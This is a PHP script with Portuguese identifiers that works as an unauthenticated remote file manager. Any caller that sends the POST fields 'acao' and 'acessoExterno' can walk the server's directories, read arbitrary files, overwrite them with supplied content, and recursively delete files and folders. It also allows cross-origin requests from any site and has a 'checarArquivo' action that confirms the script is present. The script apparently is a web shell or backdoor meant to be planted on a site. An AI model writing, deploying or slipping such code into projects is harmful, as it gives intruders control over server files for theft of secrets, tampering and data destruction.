<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: text/html; charset=utf-8');
date_default_timezone_set('America/Sao_Paulo');

define( 'CONFIG', true);

if(isset($_POST['acao']) && isset($_POST['acessoExterno'])) {


	if($_POST['acao'] == 'checarArquivo') {
		exit(json_encode(array('success' => true, 'message' => 'Arquivo verificado com sucesso')));
	}

	function scanDirectory($dir, $scanSubDir = 1, $dirScanned = 0) {
		$result = array();
		$cdir = scandir($dir);
		foreach ($cdir as $key => $value) {
			if (!in_array($value,array(".",".."))) {
				if (is_dir($dir . DIRECTORY_SEPARATOR . $value)) {
					if($scanSubDir === true || $dirScanned <= $scanSubDir) {
						$dirScanned++;
						$result['dir'][$value] = array(
							'name' => $value,
							'path' => $dir . DIRECTORY_SEPARATOR . $value,
							'subdir' => scanDirectory($dir . DIRECTORY_SEPARATOR . $value, $scanSubDir),
						);
					} else {
						$result['dir'][$value] = array(
							'name' => $value,
							'path' => $dir . DIRECTORY_SEPARATOR . $value,
							'subdir' => [],
						);
					}
				} else {
					if(!isset($result['file']) || !is_array($result['file'])) {
						$result['file'] = array();
					}
					array_push($result['file'], array(
						'name' => $value,
						'path' => $dir . DIRECTORY_SEPARATOR . $value,
					));
				}
			}
		}

		return $result;
	}

	function delDirectory($dir, $dirAtual, $delAtual = true) {
		$files = array_diff(scandir($dir), array('.','..'));
		foreach ($files as $file) {
			(is_dir($dir.DIRECTORY_SEPARATOR.$file)) ? delDirectory($dir.DIRECTORY_SEPARATOR.$file, $dirAtual, $delAtual) : unlink($dir.DIRECTORY_SEPARATOR.$file);
		}
		if($delAtual === true) {
			return rmdir($dir);
		} else if($dir != $dirAtual) {
			return rmdir($dir);
		}
	}

	if($_POST['acao'] == 'scanBasico') {

		$diretorioParaEscanear = getcwd();
		for ($i = -1; $i < (int) $_POST['qtdVoltar']; $i++) {
			$diretorioParaEscanear = dirname($diretorioParaEscanear);
		}
		try {
			$dir = array(
				'success' => true,
				'message' => 'Escaneado com sucesso',
				'scan' => scanDirectory($diretorioParaEscanear, 0),
				'diretorio' => $diretorioParaEscanear
			);
		} catch (Exception $e) {
			$dir = array(
				'success' => false,
				'message' => 'Erro ao escanear: '.$e->getMessage(),
				'scan' => [],
				'diretorio' => $diretorioParaEscanear
			);
		}
		return exit(json_encode($dir));
	}

	if($_POST['acao'] == 'scanCompleto') {
		$diretorioParaEscanear = getcwd();
		for ($i = -1; $i < (int) $_POST['qtdVoltar']; $i++) {
			$diretorioParaEscanear = dirname($diretorioParaEscanear);
		}
		try {
			$dir = array(
				'success' => true,
				'message' => 'Escaneado com sucesso',
				'scan' => scanDirectory($diretorioParaEscanear, true),
				'diretorio' => $diretorioParaEscanear
			);
		} catch (Exception $e) {
			$dir = array(
				'success' => false,
				'message' => 'Erro ao escanear: '.$e->getMessage(),
				'scan' => [],
				'diretorio' => $diretorioParaEscanear
			);
		}
		return exit(json_encode($dir));
	}

	if($_POST['acao'] == 'visualizarConteudoArquivo') {
		if(file_exists($_POST['path'])) {
			try {
				$ret = array(
					'success' => true,
					'message' => 'Arquivo carregado com sucesso',
					'conteudo' => file_get_contents($_POST['path']),
				);
			} catch (Exception $e) {
				$ret = array(
					'success' => false,
					'message' => 'Erro ao escanear: '.$e->getMessage(),
					'conteudo' => 'Arquivo não encontrado ou não foi possível ler o conteúdo do arquivo...',
				);
			}
			exit(json_encode($ret));
		} else {
			exit(json_encode(array(
				'success' => false,
				'message' => 'O arquivo não existe',
				'conteudo' => ''
			)));
		}
	}

	if($_POST['acao'] == 'salvarConteudoArquivo') {
		if(file_exists($_POST['path'])) {
			try {
				$ret = array(
					'success' => true,
					'message' => 'Arquivo carregado com sucesso',
					'conteudo' => file_get_contents($_POST['path']),
				);
			} catch (Exception $e) {
				$ret = array(
					'success' => false,
					'message' => 'Erro ao escanear: '.$e->getMessage(),
					'conteudo' => 'Arquivo não encontrado ou não foi possível ler o conteúdo do arquivo...',
				);
			}
			try {
				$arquivo = fopen($_POST['path'], 'w');
				fwrite($arquivo, $_POST['conteudo']);
				fclose($arquivo);
				exit(json_encode(array(
					'success' => true,
					'message' => 'Arquivo editado com sucesso',
				)));
			} catch (Exception $e) {
				exit(json_encode(array(
					'success' => false,
					'message' => 'Erro ao salvar: '.$e->getMessage(),
				)));
			}
		} else {
			exit(json_encode(array(
				'success' => false,
				'message' => 'O arquivo não existe',
			)));
		}
	}

	if($_POST['acao'] == 'apagarArquivoOuPasta') {
		if(file_exists($_POST['path'])) {
			if(is_dir($_POST['path'])) {
				try {
					delDirectory($_POST['path'], $_POST['path'], true);
					exit(json_encode(array(
						'success' => true,
						'message' => 'Diretório apagado com sucesso',
					)));
				} catch (Exception $e) {
					exit(json_encode(array(
						'success' => false,
						'message' => 'Não foi possível apagar o diretório: '.$e->getMessage(),
					)));
				}
			} else {
				try {
					unlink($_POST['path']);
					exit(json_encode(array(
						'success' => true,
						'message' => 'Arquivo apagado com sucesso',
					)));
				} catch (Exception $e) {
					exit(json_encode(array(
						'success' => false,
						'message' => 'Não foi possível apagar o arquivo: '.$e->getMessage(),
					)));
				}
			}
		}
	}

	if($_POST['acao'] == 'apagarArquivoEPastas') {
		if(file_exists($_POST['path'])) {
			if(is_dir($_POST['path'])) {
				try {
					delDirectory($_POST['path'], $_POST['path'], false);
					exit(json_encode(array(
						'success' => true,
						'message' => 'Todos os arquivos e pastas foram apagados com sucesso',
					)));
				} catch (Exception $e) {
					exit(json_encode(array(
						'success' => false,
						'message' => 'Não foi possível apagar os dados do diretório: '.$e->getMessage(),
					)));
				}
			} else {
				exit(json_encode(array(
					'success' => false,
					'message' => 'Diretório inválido',
				)));
			}
		}
	}
}
